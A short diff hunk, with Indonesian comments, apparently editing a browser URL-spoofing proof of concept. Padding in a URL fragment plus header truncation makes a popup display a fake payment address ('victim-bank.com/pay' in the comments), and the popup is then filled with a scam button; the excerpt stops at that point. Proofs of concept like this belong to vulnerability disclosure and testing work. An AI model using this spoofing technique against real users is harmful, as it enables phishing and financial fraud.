@@ -16,8 +16,8 @@
                     // Klik pertama: buka popup, fragment berisi URL palsu
                     // about:blank memiliki host kosong, getUrlString() akan fallback ke full spec
                     // TruncateAt.START membuat header hanya menampilkan …https://victim-bank.com/pay
-                    const payload = '////' + 'a'.repeat(300) + '////https://google.com/pay';
-                    const popup = window.open('about:blank#' + payload, 'poc', 'width=400,height=400');
+                    const payload = '' + 'a'.repeat(300) + 'https://google.com/pay';
+                    const popup = window.open('google.com#' + payload, 'poc', 'width=400,height=400');
 
                     // Isi popup dengan tombol penipuan (menggunakan DOM API, bukan document.write, agar URL tidak di-reset)
                     popup.document.body.innerHTML = `
